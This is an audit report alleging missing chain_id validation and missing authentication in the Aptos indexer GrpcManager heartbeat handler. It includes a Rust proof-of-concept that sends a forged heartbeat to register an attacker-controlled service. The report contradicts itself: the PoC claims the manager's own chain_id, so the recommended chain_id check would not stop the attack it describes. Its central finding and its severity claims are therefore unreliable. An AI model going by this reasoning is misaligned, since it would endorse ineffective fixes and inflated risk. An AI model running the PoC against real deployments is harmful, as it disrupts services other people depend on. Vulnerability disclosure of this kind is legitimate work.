# Audit Report

## Title
Missing Chain ID Validation in GrpcManager Heartbeat Handler Allows Cross-Chain Service Registration and Indexer Desynchronization

## Summary
The GrpcManager service in the Aptos indexer infrastructure accepts HeartbeatRequest messages from data services without validating that the `chain_id` field in ServiceInfo matches the expected chain_id of the GrpcManager instance. This allows an attacker to register malicious data services claiming to serve one chain while actually serving another, potentially causing multiple indexer components to process transactions from different blockchains and become desynchronized.

## Finding Description

The vulnerability exists in the heartbeat handling mechanism of the indexer gRPC system. The GrpcManager maintains a registry of data services (live, historical), fullnodes, and other manager instances through a heartbeat protocol where services periodically announce their presence and status.

**The vulnerability flow:**

1. **Heartbeat Acceptance Without Validation**: In the GrpcManagerService, the `heartbeat` method accepts HeartbeatRequest messages containing ServiceInfo with a `chain_id` field, but performs no validation against the GrpcManager's configured chain_id. [1](#0-0) 

2. **No Chain ID Validation in Handler**: The `handle_heartbeat` method in MetadataManager dispatches to type-specific handlers without any chain_id validation. [2](#0-1) 

3. **Handlers Accept Any Chain ID**: None of the type-specific handlers validate the chain_id:
   - `handle_live_data_service_info` accepts LiveDataServiceInfo containing `chain_id` without validation [3](#0-2) 

   - `handle_historical_data_service_info` accepts HistoricalDataServiceInfo containing `chain_id` without validation [4](#0-3) 

   - `handle_fullnode_info` accepts FullnodeInfo containing `chain_id` without validation [5](#0-4) 

   - `handle_grpc_manager_info` accepts GrpcManagerInfo containing `chain_id` without validation [6](#0-5) 

4. **Service Selection Ignores Chain ID**: When clients request a data service, the selection methods (`pick_live_data_service` and `pick_historical_data_service`) only consider stream count and version criteria, never validating chain_id. [7](#0-6) 

5. **No Authentication**: The GrpcManager service is initialized without any authentication or authorization mechanism, allowing any network peer to send heartbeat requests. [8](#0-7) 

**Attack Scenario:**

1. Attacker discovers a GrpcManager endpoint configured for Aptos mainnet (chain_id=1)
2. Attacker operates a legitimate data service connected to Aptos testnet (chain_id=2)
3. Attacker crafts HeartbeatRequest messages with ServiceInfo claiming chain_id=1 (mainnet) but with the attacker's testnet service address
4. GrpcManager accepts and stores this service in its registry without validation
5. Legitimate indexer clients query GrpcManager for available data services
6. GrpcManager may route clients to the attacker's testnet service
7. Different indexer components receive transactions from different chains (some from mainnet, some from testnet)
8. This causes critical desynchronization: indexers process incompatible transaction streams, leading to inconsistent state across the distributed indexer infrastructure

**Protocol Buffer Definition showing chain_id fields:** [9](#0-8) 

## Impact Explanation

This vulnerability constitutes **High Severity** under the Aptos bug bounty program criteria for the following reasons:

1. **Significant Protocol Violation**: The indexer infrastructure is critical for the Aptos ecosystem, supporting block explorers, wallets, analytics platforms, and DeFi applications. Desynchronization breaks the fundamental assumption that all indexer components process the same canonical blockchain state.

2. **Operational Disruption**: When different indexer components process transactions from different chains:
   - Block explorers display incorrect transaction history
   - Wallets show wrong account balances
   - Analytics platforms generate invalid metrics
   - DeFi applications make decisions based on corrupted data

3. **API Crashes and Service Degradation**: Downstream systems expecting consistent data will encounter unexpected transaction formats, account states, and event structures from different chains, potentially causing crashes and service failures that meet the "API crashes" criterion for High severity.

4. **Wide Attack Surface**: The vulnerability affects all GrpcManager deployments that don't implement network-level access controls, as no application-level authentication exists.

While this does not reach **Critical Severity** because:
- It does not directly affect consensus or validator operations
- It does not cause loss of funds in the core blockchain
- It is recoverable by restarting services with correct configurations
- It affects indexer infrastructure rather than core blockchain security

## Likelihood Explanation

The likelihood of exploitation is **High** because:

1. **No Authentication Required**: The GrpcManager accepts heartbeat requests from any network peer without authentication or authorization checks, as evidenced by the service initialization code.

2. **Simple Exploitation**: An attacker only needs to:
   - Discover a GrpcManager endpoint (often public for indexer infrastructure)
   - Run a data service connected to any Aptos chain
   - Send gRPC heartbeat messages with crafted ServiceInfo

3. **No Special Privileges**: The attack requires no validator access, governance participation, or privileged accounts.

4. **Detection Difficulty**: The malicious service registration appears legitimate to the GrpcManager, and clients may not immediately detect they're receiving data from the wrong chain, especially if they don't validate the chain_id field in responses.

5. **Persistent Impact**: Once registered, the malicious service remains in the registry until it becomes stale (60 seconds without heartbeat), during which multiple clients may be affected.

## Recommendation

Implement chain_id validation in the heartbeat handling flow. The fix should be applied at the earliest possible point to reject invalid requests:

**Option 1: Validate in handle_heartbeat (Recommended)**

Add validation in the `MetadataManager::handle_heartbeat` method before dispatching to type-specific handlers:

```rust
pub(crate) fn handle_heartbeat(&self, address: GrpcAddress, info: Info) -> Result<()> {
    // Extract and validate chain_id from the info
    let info_chain_id = match &info {
        Info::LiveDataServiceInfo(info) => info.chain_id,
        Info::HistoricalDataServiceInfo(info) => info.chain_id,
        Info::FullnodeInfo(info) => info.chain_id,
        Info::GrpcManagerInfo(info) => info.chain_id,
    };
    
    ensure!(
        info_chain_id == self.chain_id,
        "Chain ID mismatch: service reports {} but manager expects {}",
        info_chain_id,
        self.chain_id
    );
    
    match info {
        Info::LiveDataServiceInfo(info) => self.handle_live_data_service_info(address, info),
        Info::HistoricalDataServiceInfo(info) => {
            self.handle_historical_data_service_info(address, info)
        },
        Info::FullnodeInfo(info) => self.handle_fullnode_info(address, info),
        Info::GrpcManagerInfo(info) => self.handle_grpc_manager_info(address, info),
    }
}
```

**Option 2: Add Authentication Layer**

Implement authentication/authorization using gRPC interceptors to restrict which services can register:

```rust
// In grpc_manager.rs
let service = GrpcManagerServer::with_interceptor(
    GrpcManagerService::new(...),
    check_auth_token
)
.send_compressed(CompressionEncoding::Zstd)
.accept_compressed(CompressionEncoding::Zstd)
.max_encoding_message_size(MAX_MESSAGE_SIZE)
.max_decoding_message_size(MAX_MESSAGE_SIZE);

fn check_auth_token(req: Request<()>) -> Result<Request<()>, Status> {
    // Validate authentication token from metadata
    match req.metadata().get("authorization") {
        Some(token) if is_valid_token(token) => Ok(req),
        _ => Err(Status::unauthenticated("Invalid auth token"))
    }
}
```

**Option 3: Defense in Depth**

Implement both chain_id validation AND authentication for comprehensive security.

## Proof of Concept

```rust
// PoC: Malicious service registration with wrong chain_id
// File: poc_chain_id_injection.rs

use anyhow::Result;
use aptos_protos::indexer::v1::{
    grpc_manager_client::GrpcManagerClient,
    service_info::Info,
    HeartbeatRequest,
    LiveDataServiceInfo,
    ServiceInfo,
};
use aptos_indexer_grpc_utils::timestamp_now_proto;
use tonic::transport::Channel;

#[tokio::main]
async fn main() -> Result<()> {
    // Assume GrpcManager is configured for mainnet (chain_id=1)
    let grpc_manager_address = "http://mainnet-grpc-manager:50051";
    
    // Attacker connects to GrpcManager
    let channel = Channel::from_shared(grpc_manager_address)?
        .connect()
        .await?;
    let mut client = GrpcManagerClient::new(channel);
    
    // Attacker crafts heartbeat claiming mainnet chain_id
    // but advertising their testnet service
    let malicious_heartbeat = HeartbeatRequest {
        service_info: Some(ServiceInfo {
            address: Some("http://attacker-testnet-service:50052".to_string()),
            info: Some(Info::LiveDataServiceInfo(LiveDataServiceInfo {
                chain_id: 1,  // LIES: Claims mainnet
                timestamp: Some(timestamp_now_proto()),
                known_latest_version: Some(1000000),
                stream_info: None,
                min_servable_version: Some(0),
            })),
        }),
    };
    
    // Send malicious heartbeat
    let response = client.heartbeat(malicious_heartbeat).await?;
    println!("Malicious service registered! Response: {:?}", response);
    
    // The attacker's testnet service is now in the mainnet GrpcManager registry
    // Clients requesting data services may be routed to the testnet service
    // causing desynchronization across the indexer infrastructure
    
    Ok(())
}

// To test:
// 1. Deploy GrpcManager configured for mainnet (chain_id=1)
// 2. Run this PoC to register a testnet service with wrong chain_id
// 3. Query GrpcManager for available services - the malicious service appears
// 4. Have indexer clients connect - they may receive testnet transactions
// 5. Observe desynchronization: different clients process different chains
```

**Verification Steps:**
1. Deploy a GrpcManager instance with chain_id=1
2. Run the PoC to register a service with chain_id=1 but serving chain_id=2 data
3. Observe that the heartbeat is accepted without error
4. Query the GrpcManager's metadata to see the malicious service is registered
5. Have multiple indexer clients connect and observe they may be routed to different chains

## Notes

**Additional Security Considerations:**

1. The vulnerability affects all four service types that can register via heartbeat: LiveDataService, HistoricalDataService, Fullnode, and GrpcManager peer instances.

2. The MetadataManager stores a `chain_id` field but only uses it for outgoing heartbeats to other managers, never for validating incoming heartbeats. [10](#0-9) 

3. The ConnectionManager on the data service side correctly sets its own chain_id when sending heartbeats, showing the intended behavior. [11](#0-10) 

4. While some downstream processors validate chain_id in file store metadata, this is insufficient to prevent the registration attack and initial desynchronization.

5. The GrpcManager returns its own chain_id in GetTransactions responses, but this doesn't prevent routing to wrong-chain services. [12](#0-11)

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L71-88)
```rust
    fn pick_live_data_service(&self, starting_version: u64) -> Option<String> {
        let mut candidates = vec![];
        for candidate in self.metadata_manager.get_live_data_services_info() {
            if let Some(info) = candidate.1.back().as_ref() {
                // TODO(grao): Handle the case when the requested starting version is beyond the
                // latest version.
                if info.min_servable_version.is_none()
                    || starting_version < info.min_servable_version.unwrap()
                {
                    continue;
                }
                let num_active_streams = info.stream_info.as_ref().unwrap().active_streams.len();
                candidates.push((candidate.0, num_active_streams));
            }
        }

        Self::pick_data_service_from_candidate(candidates)
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L110-127)
```rust
    async fn heartbeat(
        &self,
        request: Request<HeartbeatRequest>,
    ) -> Result<Response<HeartbeatResponse>, Status> {
        let request = request.into_inner();
        if let Some(service_info) = request.service_info {
            if let Some(address) = service_info.address {
                if let Some(info) = service_info.info {
                    return self
                        .handle_heartbeat(address, info)
                        .await
                        .map_err(|e| Status::internal(format!("Error handling heartbeat: {e}")));
                }
            }
        }

        Err(Status::invalid_argument("Bad request."))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L129-146)
```rust
    async fn get_transactions(
        &self,
        request: Request<GetTransactionsRequest>,
    ) -> Result<Response<TransactionsResponse>, Status> {
        let request = request.into_inner();
        let transactions = self
            .data_manager
            .get_transactions(request.starting_version(), MAX_SIZE_BYTES_FROM_CACHE)
            .await
            .map_err(|e| Status::internal(format!("{e}")))?;

        Ok(Response::new(TransactionsResponse {
            transactions,
            chain_id: Some(self.chain_id),
            // Not used.
            processed_range: None,
        }))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L127-165)
```rust
pub(crate) struct MetadataManager {
    chain_id: u64,
    self_advertised_address: GrpcAddress,
    grpc_managers: DashMap<GrpcAddress, Peer>,
    fullnodes: DashMap<GrpcAddress, Fullnode>,
    live_data_services: DashMap<GrpcAddress, LiveDataService>,
    historical_data_services: DashMap<GrpcAddress, HistoricalDataService>,
    known_latest_version: AtomicU64,
    // NOTE: We assume the master is statically configured for now.
    master_address: Mutex<Option<GrpcAddress>>,
}

impl MetadataManager {
    pub(crate) fn new(
        chain_id: u64,
        self_advertised_address: GrpcAddress,
        grpc_manager_addresses: Vec<GrpcAddress>,
        fullnode_addresses: Vec<GrpcAddress>,
        master_address: Option<GrpcAddress>,
    ) -> Self {
        let grpc_managers = DashMap::new();
        for address in grpc_manager_addresses {
            grpc_managers.insert(address.clone(), Peer::new(address));
        }
        let fullnodes = DashMap::new();
        for address in fullnode_addresses {
            fullnodes.insert(address.clone(), Fullnode::new(address));
        }
        Self {
            chain_id,
            self_advertised_address,
            grpc_managers,
            fullnodes,
            live_data_services: DashMap::new(),
            historical_data_services: DashMap::new(),
            known_latest_version: AtomicU64::new(0),
            master_address: Mutex::new(master_address),
        }
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L330-339)
```rust
    pub(crate) fn handle_heartbeat(&self, address: GrpcAddress, info: Info) -> Result<()> {
        match info {
            Info::LiveDataServiceInfo(info) => self.handle_live_data_service_info(address, info),
            Info::HistoricalDataServiceInfo(info) => {
                self.handle_historical_data_service_info(address, info)
            },
            Info::FullnodeInfo(info) => self.handle_fullnode_info(address, info),
            Info::GrpcManagerInfo(info) => self.handle_grpc_manager_info(address, info),
        }
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L489-509)
```rust
    fn handle_live_data_service_info(
        &self,
        address: GrpcAddress,
        mut info: LiveDataServiceInfo,
    ) -> Result<()> {
        let mut entry = self
            .live_data_services
            .entry(address.clone())
            .or_insert(LiveDataService::new(address));
        if info.stream_info.is_none() {
            info.stream_info = Some(StreamInfo {
                active_streams: vec![],
            });
        }
        entry.value_mut().recent_states.push_back(info);
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L511-531)
```rust
    fn handle_historical_data_service_info(
        &self,
        address: GrpcAddress,
        mut info: HistoricalDataServiceInfo,
    ) -> Result<()> {
        let mut entry = self
            .historical_data_services
            .entry(address.clone())
            .or_insert(HistoricalDataService::new(address));
        if info.stream_info.is_none() {
            info.stream_info = Some(StreamInfo {
                active_streams: vec![],
            });
        }
        entry.value_mut().recent_states.push_back(info);
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L533-550)
```rust
    fn handle_fullnode_info(&self, address: GrpcAddress, info: FullnodeInfo) -> Result<()> {
        let mut entry = self
            .fullnodes
            .entry(address.clone())
            .or_insert(Fullnode::new(address.clone()));
        entry.value_mut().recent_states.push_back(info);
        if let Some(known_latest_version) = info.known_latest_version {
            trace!(
                "Received known_latest_version ({known_latest_version}) from fullnode {address}."
            );
            self.update_known_latest_version(known_latest_version);
        }
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L552-568)
```rust
    fn handle_grpc_manager_info(&self, address: GrpcAddress, info: GrpcManagerInfo) -> Result<()> {
        self.master_address
            .lock()
            .unwrap()
            .clone_from(&info.master_address);

        let mut entry = self
            .grpc_managers
            .entry(address.clone())
            .or_insert(Peer::new(address));
        entry.value_mut().recent_states.push_back(info);
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/grpc_manager.rs (L91-100)
```rust
    pub(crate) fn start(&self, service_config: &ServiceConfig) -> Result<()> {
        let service = GrpcManagerServer::new(GrpcManagerService::new(
            self.chain_id,
            self.metadata_manager.clone(),
            self.data_manager.clone(),
        ))
        .send_compressed(CompressionEncoding::Zstd)
        .accept_compressed(CompressionEncoding::Zstd)
        .max_encoding_message_size(MAX_MESSAGE_SIZE)
        .max_decoding_message_size(MAX_MESSAGE_SIZE);
```

**File:** protos/proto/aptos/indexer/v1/grpc.proto (L35-62)
```text
message LiveDataServiceInfo {
  uint64 chain_id = 1;
  optional aptos.util.timestamp.Timestamp timestamp = 2;
  optional uint64 known_latest_version = 3;
  optional StreamInfo stream_info = 4;
  // If not present, it means the data service is not available to serve anything yet.
  optional uint64 min_servable_version = 5;
}

message HistoricalDataServiceInfo {
  uint64 chain_id = 1;
  optional aptos.util.timestamp.Timestamp timestamp = 2;
  optional uint64 known_latest_version = 3;
  optional StreamInfo stream_info = 4;
}

message FullnodeInfo {
  uint64 chain_id = 1;
  optional aptos.util.timestamp.Timestamp timestamp = 2;
  optional uint64 known_latest_version = 3;
}

message GrpcManagerInfo {
  uint64 chain_id = 1;
  optional aptos.util.timestamp.Timestamp timestamp = 2;
  optional uint64 known_latest_version = 3;
  optional string master_address = 4;
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/connection_manager.rs (L249-301)
```rust
    async fn heartbeat(&self, address: &str) -> Result<(), tonic::Status> {
        info!("Sending heartbeat to GrpcManager {address}.");
        let timestamp = Some(timestamp_now_proto());
        let known_latest_version = Some(self.known_latest_version());
        let stream_info = Some(StreamInfo {
            active_streams: self.get_active_streams(),
        });

        let info = if self.is_live_data_service {
            let min_servable_version = match LIVE_DATA_SERVICE.get() {
                Some(svc) => Some(svc.get_min_servable_version().await),
                None => None,
            };
            Some(Info::LiveDataServiceInfo(LiveDataServiceInfo {
                chain_id: self.chain_id,
                timestamp,
                known_latest_version,
                stream_info,
                min_servable_version,
            }))
        } else {
            Some(Info::HistoricalDataServiceInfo(HistoricalDataServiceInfo {
                chain_id: self.chain_id,
                timestamp,
                known_latest_version,
                stream_info,
            }))
        };
        let service_info = ServiceInfo {
            address: Some(self.self_advertised_address.clone()),
            info,
        };
        let request = HeartbeatRequest {
            service_info: Some(service_info),
        };
        let response = self
            .grpc_manager_connections
            .get(address)
            // TODO(grao): Consider to not use unwrap here.
            .unwrap()
            .clone()
            .heartbeat(request)
            .await?
            .into_inner();
        if let Some(known_latest_version) = response.known_latest_version {
            info!("Received known_latest_version ({known_latest_version}) from GrpcManager {address}.");
            self.update_known_latest_version(known_latest_version);
        } else {
            warn!("HeartbeatResponse doesn't contain known_latest_version, GrpcManager address: {address}");
        }

        Ok(())
    }
```
